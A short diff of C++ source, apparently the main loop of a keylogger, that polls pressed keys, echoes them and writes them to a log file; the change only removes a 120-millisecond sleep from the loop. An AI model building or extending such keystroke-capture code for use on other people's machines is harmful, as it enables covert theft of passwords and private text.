@@ -2,8 +2,6 @@
 #include "keyLogger.h"
 #include "windowManager.h"
 
-#define ITERATION_DELAY 120
-
 std::string formatPrintable(keyStroke key);
 
 logManager* logManager::manager = NULL;
@@ -22,7 +20,7 @@ int main()
         key = keyLogger::checkPressedKey();
         std::cout << formatPrintable(key);
         manager->writeCharToLog(formatPrintable(key));
-        Sleep(ITERATION_DELAY); 
+
     }
 	return 0;
 }
